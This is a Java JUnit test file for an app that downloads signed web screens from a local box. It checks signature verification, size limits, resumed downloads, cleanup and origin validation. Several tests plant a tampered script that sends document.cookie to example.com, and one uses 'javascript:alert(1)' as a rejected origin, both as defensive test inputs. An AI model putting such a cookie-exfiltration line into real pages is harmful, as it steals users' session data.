package com.colmhewson.crewbox;

import static org.junit.Assert.assertArrayEquals;
import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertThrows;
import static org.junit.Assert.assertTrue;

import com.google.crypto.tink.subtle.Ed25519Sign;
import com.google.gson.JsonObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.GeneralSecurityException;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;

/**
 * Screens from a box, fetched from a stand-in for one into a folder of the
 * test's own where the app has getNoBackupFilesDir(). The rules both apps
 * share with the release are ScreensFixturesTest's; these are what the
 * download does with them.
 */
public class ScreensTest {

  @Rule public TemporaryFolder files = new TemporaryFolder();

  /** Keys of the test's own, from fixed seeds. No app trusts either. */
  private static final Ed25519Sign.KeyPair KEY = keyFrom("crewbox screens test key");
  private static final Ed25519Sign.KeyPair STRANGER = keyFrom("someone else's key");

  private static final String VERSION = "1.2.0+abc1234";
  private static final String BUILT_IN = "1.1.0+def5678";
  private static final String SCRIPT = "assets/index-Ab_9.js";

  private File root() {
    return new File(files.getRoot(), Screens.FOLDER);
  }

  private static Screens.App app(String floor) {
    return new Screens.App(new byte[][] {KEY.getPublicKey()}, 1, 1, floor, BUILT_IN);
  }

  private Screens.Answer prepare(Box box) {
    return Screens.prepare(box, root(), app("1.0.0"), () -> Long.MAX_VALUE);
  }

  /** A box, with what it serves at each path, and what it was asked for. */
  private static class Box implements Screens.Box {
    final Map<String, byte[]> served = new LinkedHashMap<>();
    final Set<String> silent = new HashSet<>();
    final List<String> asked = new ArrayList<>();

    @Override
    public InputStream open(String path) throws IOException {
      asked.add(path);
      if (silent.contains(path)) throw new IOException("timeout");
      byte[] bytes = served.get(path);
      return bytes == null ? null : new ByteArrayInputStream(bytes);
    }
  }

  /** A release's screens, saying they are `version` and need `needs` of the native contract. */
  private static Map<String, byte[]> screens(String version, int needs) {
    JsonObject contract = new JsonObject();
    contract.addProperty("needs", needs);
    contract.addProperty("builtFor", Math.max(needs, 1));
    JsonObject info = new JsonObject();
    info.addProperty("kind", "crewbox-web");
    info.addProperty("version", version);
    info.addProperty("protocol", 1);
    info.add("nativeApi", contract);
    Map<String, byte[]> screens = new LinkedHashMap<>();
    screens.put(Screens.INFO, utf8(info + "\n"));
    screens.put("index.html", utf8("<!doctype html><script src=\"/" + SCRIPT + "\"></script>\n"));
    screens.put(SCRIPT, utf8("console.log('" + version + "')\n"));
    return screens;
  }

  /** WEBSUMS for `screens`, as sha256sum writes it. */
  private static String sums(Map<String, byte[]> screens) {
    StringBuilder sums = new StringBuilder();
    for (Map.Entry<String, byte[]> file : screens.entrySet()) {
      sums.append(Screens.sha256(file.getValue())).append("  ").append(file.getKey()).append('\n');
    }
    return sums.toString();
  }

  /** A box that runs `version` and serves `screens`, with a list of them `key` signed. */
  private static Box box(String version, Map<String, byte[]> screens, Ed25519Sign.KeyPair key) {
    Box box = new Box();
    box.served.putAll(screens);
    String sums = sums(screens);
    box.served.put(Screens.OFFER, offer(version, sums, sign(key, sums)));
    return box;
  }

  private static byte[] offer(String version, String sums, String signature) {
    JsonObject offer = new JsonObject();
    offer.addProperty("version", version);
    offer.addProperty("sums", sums);
    offer.addProperty("signature", signature);
    return utf8(offer.toString());
  }

  @Test
  public void keepsSignedScreensInAFolderNamedForTheirVersion() throws IOException {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Screens.Answer answer = prepare(box(VERSION, screens, KEY));
    assertEquals("ready", answer.result);
    assertEquals(VERSION, answer.version);

    File folder = new File(root(), VERSION);
    for (Map.Entry<String, byte[]> file : screens.entrySet()) {
      assertArrayEquals(file.getKey(), file.getValue(), read(new File(folder, file.getKey())));
    }
    String sums = sums(screens);
    assertEquals(sums, text(new File(folder, "WEBSUMS")));
    assertEquals(Screens.sha256(utf8(sums)) + "\n", text(new File(folder, ".checked")));
    // These names reach phones: a change strands every set kept on them.
    assertEquals("crewbox-screens", Screens.FOLDER);
    assertEquals(Collections.singletonList(VERSION), Arrays.asList(root().list()));
  }

  @Test
  public void fetchesNothingForTheScreensTheAppCameWith() {
    Box box = box(BUILT_IN, screens(BUILT_IN, 1), STRANGER);
    Screens.Answer answer = prepare(box);
    assertEquals("same", answer.result);
    assertEquals(BUILT_IN, answer.version);
    assertEquals(Collections.singletonList(Screens.OFFER), box.asked);
    assertFalse(root().exists());
  }

  @Test
  public void takesKeptScreensWithoutFetchingThemAgain() {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    prepare(box);
    box.asked.clear();
    Screens.Answer answer = prepare(box);
    assertEquals("ready", answer.result);
    assertEquals(Collections.singletonList(Screens.OFFER), box.asked);
  }

  @Test
  public void fetchesKeptScreensAgainWhenAFileHasChanged() throws IOException {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    prepare(box);
    File script = new File(new File(root(), VERSION), SCRIPT);
    write(script, utf8("fetch('https://example.com/?' + document.cookie)\n"));

    box.asked.clear();
    assertEquals("ready", prepare(box).result);
    assertTrue(box.asked.contains(SCRIPT));
    assertArrayEquals(screens.get(SCRIPT), read(script));
  }

  @Test
  public void fetchesKeptScreensAgainWhenTheirListIsNotTheOneSigned() throws IOException {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    prepare(box);
    // A list and mark that agree, over a file of someone else's.
    File folder = new File(root(), VERSION);
    byte[] script = utf8("fetch('https://example.com/?' + document.cookie)\n");
    write(new File(folder, SCRIPT), script);
    Map<String, byte[]> changed = new LinkedHashMap<>(screens);
    changed.put(SCRIPT, script);
    String sums = sums(changed);
    write(new File(folder, "WEBSUMS"), utf8(sums));
    write(new File(folder, ".checked"), utf8(Screens.sha256(utf8(sums)) + "\n"));

    box.asked.clear();
    assertEquals("ready", prepare(box).result);
    assertTrue(box.asked.contains(SCRIPT));
    assertArrayEquals(screens.get(SCRIPT), read(new File(folder, SCRIPT)));
  }

  @Test
  public void fetchesKeptScreensAgainWhenTheirMarkIsNotTheirList() throws IOException {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    prepare(box);
    File mark = new File(new File(root(), VERSION), ".checked");
    write(mark, utf8(Screens.sha256(utf8("another list")) + "\n"));

    box.asked.clear();
    assertEquals("ready", prepare(box).result);
    assertTrue(box.asked.contains(SCRIPT));
    assertEquals(Screens.sha256(utf8(sums(screens(VERSION, 1)))) + "\n", text(mark));
  }

  @Test
  public void fetchesScreensAgainThatAreKeptUnderAnotherVersion() throws IOException {
    prepare(box(VERSION, screens(VERSION, 1), KEY));
    // A whole set a release signed, in a folder named for another version.
    String next = "1.2.1+abc1234";
    assertTrue(new File(root(), VERSION).renameTo(new File(root(), next)));

    Box box = box(next, screens(next, 1), KEY);
    Screens.Answer answer = prepare(box);
    assertEquals("ready", answer.result);
    assertEquals(next, answer.version);
    assertTrue(box.asked.contains(SCRIPT));
    assertArrayEquals(
        screens(next, 1).get(SCRIPT), read(new File(new File(root(), next), SCRIPT)));
  }

  @Test
  public void refusesScreensSignedWithAKeyItDoesNotTrust() {
    Box box = box(VERSION, screens(VERSION, 1), STRANGER);
    Screens.Answer answer = prepare(box);
    assertEquals("unsigned", answer.result);
    assertEquals(Collections.singletonList(Screens.OFFER), box.asked);
    assertFalse(root().exists());
  }

  @Test
  public void refusesAListChangedAfterItWasSigned() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    Map<String, byte[]> more = new LinkedHashMap<>(screens);
    more.put("assets/extra.js", utf8("alert(1)\n"));
    String signature = sign(KEY, sums(screens));
    box.served.put(Screens.OFFER, offer(VERSION, sums(more), signature));
    assertEquals("unsigned", prepare(box).result);
    assertEquals(Collections.singletonList(Screens.OFFER), box.asked);
  }

  @Test
  public void refusesSignedScreensThatLeaveOutWhatTheyAre() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    screens.remove(Screens.INFO);
    Box box = box(VERSION, screens, KEY);
    Screens.Answer answer = prepare(box);
    assertEquals("unsigned", answer.result);
    assertEquals("WEBSUMS doesn't list crewbox-web.json", answer.reason);
  }

  @Test
  public void answersUnsignedForABoxWithNoSignedScreens() {
    Box box = new Box();
    Screens.Answer answer = prepare(box);
    assertEquals("unsigned", answer.result);
    assertNull(answer.version);
  }

  @Test
  public void answersFailedWhenTheBoxDoesNotAnswer() {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    box.silent.add(Screens.OFFER);
    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals("api/app/screens: timeout", answer.reason);
  }

  @Test
  public void stopsReadingAnAnswerThatNeverEnds() {
    Box box =
        new Box() {
          @Override
          public InputStream open(String path) {
            asked.add(path);
            return new InputStream() {
              @Override
              public int read() {
                return '[';
              }
            };
          }
        };
    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals("api/app/screens: more than a phone takes", answer.reason);
  }

  @Test
  public void stopsFetchingOnceTheScreensAreMoreThanAPhoneTakes() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    byte[] big = new byte[1024 * 1024];
    Map<String, byte[]> listed = new LinkedHashMap<>();
    listed.put(Screens.INFO, screens.get(Screens.INFO));
    listed.put("assets/big.bin", big);
    listed.put(SCRIPT, screens.get(SCRIPT));
    Endless endless = new Endless();
    Box box =
        new Box() {
          @Override
          public InputStream open(String path) throws IOException {
            return path.equals(SCRIPT) ? endless : super.open(path);
          }
        };
    box.served.putAll(box(VERSION, listed, KEY).served);

    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals(SCRIPT + ": more than a phone takes", answer.reason);
    // What the rest left of the 50 MB, and not a read more.
    long left = Screens.MAX_BYTES - big.length - listed.get(Screens.INFO).length;
    assertTrue(endless.served + " read", endless.served <= left + 16 * 1024);
    assertFalse(new File(root(), VERSION).exists());
  }

  /** A file that never ends, counting what has been read of it. */
  private static class Endless extends InputStream {
    long served;

    @Override
    public int read() {
      served++;
      return 'x';
    }

    @Override
    public int read(byte[] buffer, int offset, int length) {
      Arrays.fill(buffer, offset, offset + length, (byte) 'x');
      served += length;
      return length;
    }
  }

  @Test
  public void fetchesNoMoreForScreensThatNeedANewerApp() {
    Box box = box(VERSION, screens(VERSION, 2), KEY);
    Screens.Answer answer = prepare(box);
    assertEquals("incompatible", answer.result);
    assertEquals("app", answer.update);
    assertEquals(VERSION, answer.version);
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO), box.asked);
    assertFalse(new File(root(), VERSION).exists());
  }

  @Test
  public void fetchesNoMoreForScreensBelowTheFloor() {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    Screens.Answer answer = Screens.prepare(box, root(), app("1.3.0"), () -> Long.MAX_VALUE);
    assertEquals("incompatible", answer.result);
    assertEquals("box", answer.update);
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO), box.asked);
  }

  @Test
  public void judgesKeptScreensAgainstTheAppAsItIsNow() {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    prepare(box);
    box.asked.clear();
    // An app update that raised the floor over screens already on the phone.
    Screens.Answer answer = Screens.prepare(box, root(), app("1.3.0"), () -> Long.MAX_VALUE);
    assertEquals("incompatible", answer.result);
    assertEquals("box", answer.update);
    assertEquals(Collections.singletonList(Screens.OFFER), box.asked);
  }

  @Test
  public void refusesScreensThatAreNotTheVersionTheBoxRuns() {
    Box box = box(VERSION, screens("1.1.9+abc1234", 1), KEY);
    Screens.Answer answer = prepare(box);
    assertEquals("unsigned", answer.result);
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO), box.asked);
  }

  @Test
  public void refusesWhatScreensSayTheyAreWhenItIsNotTheFileSigned() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    box.served.put(Screens.INFO, screens(VERSION, 1).get("index.html"));
    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO), box.asked);
    assertFalse(new File(root(), VERSION).exists());
  }

  @Test
  public void asksForRoomBeforeDownloading() {
    Box box = box(VERSION, screens(VERSION, 1), KEY);
    Screens.Answer answer =
        Screens.prepare(box, root(), app("1.0.0"), () -> 10L * 1024 * 1024);
    assertEquals("failed", answer.result);
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO), box.asked);
    assertFalse(new File(root(), VERSION).exists());
  }

  @Test
  public void keepsNothingOfAFileThatIsNotTheOneSigned() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    box.served.put(SCRIPT, utf8("fetch('https://example.com/?' + document.cookie)\n"));
    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals(SCRIPT + " isn't the file that was signed", answer.reason);
    assertFalse(new File(root(), VERSION).exists());
    assertFalse(new File(new File(root(), Screens.PARTIAL + VERSION), SCRIPT).exists());
  }

  @Test
  public void carriesOnFromWhereADownloadStopped() {
    Map<String, byte[]> screens = screens(VERSION, 1);
    Box box = box(VERSION, screens, KEY);
    box.silent.add(SCRIPT);
    Screens.Answer answer = prepare(box);
    assertEquals("failed", answer.result);
    assertEquals(SCRIPT + ": timeout", answer.reason);
    assertFalse(new File(root(), VERSION).exists());

    box.silent.clear();
    box.asked.clear();
    assertEquals("ready", prepare(box).result);
    // index.html came the first time, and was checked then.
    assertEquals(Arrays.asList(Screens.OFFER, Screens.INFO, SCRIPT), box.asked);
    assertEquals(Collections.singletonList(VERSION), Arrays.asList(root().list()));
  }

  @Test
  public void takesAsManyFilesAsTheReleaseSignsAndNoMore() throws Screens.Refused {
    assertEquals(Screens.MAX_FILES, Screens.parseSums(listing(Screens.MAX_FILES)).size());
    assertThrows(
        Screens.Refused.class, () -> Screens.parseSums(listing(Screens.MAX_FILES + 1)));
  }

  /** A list of `count` files with short names, under the list's own limit either way. */
  private static byte[] listing(int count) {
    StringBuilder sums = new StringBuilder();
    for (int i = 0; i < count; i++) {
      String path = Integer.toString(i, 36) + ".js";
      sums.append(Screens.sha256(utf8(path))).append("  ").append(path).append('\n');
    }
    return utf8(sums.toString());
  }

  @Test
  public void sweepsAwayWhatNoStartWillUse() throws IOException {
    prepare(box(VERSION, screens(VERSION, 1), KEY));
    Box stopped = box("1.1.2+abc1234", screens("1.1.2+abc1234", 1), KEY);
    stopped.silent.add(SCRIPT);
    prepare(stopped);
    File unmarked = new File(root(), "1.1.3+abc1234");
    write(new File(unmarked, "index.html"), utf8("<!doctype html>\n"));
    File mismarked = new File(root(), "1.1.4+abc1234");
    write(new File(mismarked, "WEBSUMS"), utf8(sums(screens("1.1.4+abc1234", 1))));
    write(new File(mismarked, ".checked"), utf8(Screens.sha256(utf8("another list")) + "\n"));
    write(new File(root(), "notes.txt"), utf8("left by something else\n"));
    File named = new File(root(), "1.1.5+abc1234");
    write(named, utf8("a file, not a folder\n"));

    Screens.sweep(root());
    assertEquals(Collections.singletonList(VERSION), Arrays.asList(root().list()));
  }

  @Test
  public void sweepsNothingBeforeAnythingIsKept() {
    Screens.sweep(root());
    assertFalse(root().exists());
  }

  @Test
  public void takesOnlyABoxsAddress() {
    for (String origin :
        new String[] {
          "http://192.168.1.10:8080",
          "https://crewbox.local",
          "http://[fe80::1]:8080",
          "http://crewbox-2",
        }) {
      assertTrue(origin, Screens.isOrigin(origin));
    }
    for (String origin :
        new String[] {
          null,
          "",
          "http://crewbox/",
          "http://crewbox/index.html",
          "http://crewbox:8080?x=1",
          "http://user@crewbox",
          "file:///data/crewbox",
          "javascript:alert(1)",
          "HTTP://crewbox",
          " http://crewbox",
        }) {
      assertFalse(String.valueOf(origin), Screens.isOrigin(origin));
    }
  }

  @Test
  public void trustsTheKeysItCarries() {
    Screens.App app = Screens.App.thisBuild(BUILT_IN);
    assertEquals(Screens.TRUSTED_KEYS.length, app.keys.length);
    for (byte[] key : app.keys) assertEquals(32, key.length);
    assertEquals(BUILT_IN, app.builtIn);
  }

  private static Ed25519Sign.KeyPair keyFrom(String label) {
    try {
      MessageDigest hash = MessageDigest.getInstance("SHA-256");
      return Ed25519Sign.KeyPair.newKeyPairFromSeed(hash.digest(utf8(label)));
    } catch (GeneralSecurityException e) {
      throw new IllegalStateException(e);
    }
  }

  private static String sign(Ed25519Sign.KeyPair key, String sums) {
    try {
      byte[] signature = new Ed25519Sign(key.getPrivateKey()).sign(utf8(sums));
      return Base64.getEncoder().encodeToString(signature) + "\n";
    } catch (GeneralSecurityException e) {
      throw new IllegalStateException(e);
    }
  }

  private static byte[] utf8(String text) {
    return text.getBytes(StandardCharsets.UTF_8);
  }

  private static byte[] read(File file) throws IOException {
    return Files.readAllBytes(file.toPath());
  }

  private static String text(File file) throws IOException {
    return new String(read(file), StandardCharsets.UTF_8);
  }

  private static void write(File file, byte[] bytes) throws IOException {
    File parent = file.getParentFile();
    if (!parent.isDirectory() && !parent.mkdirs()) throw new IOException("mkdirs " + parent);
    try (FileOutputStream out = new FileOutputStream(file)) {
      out.write(bytes);
    }
  }
}
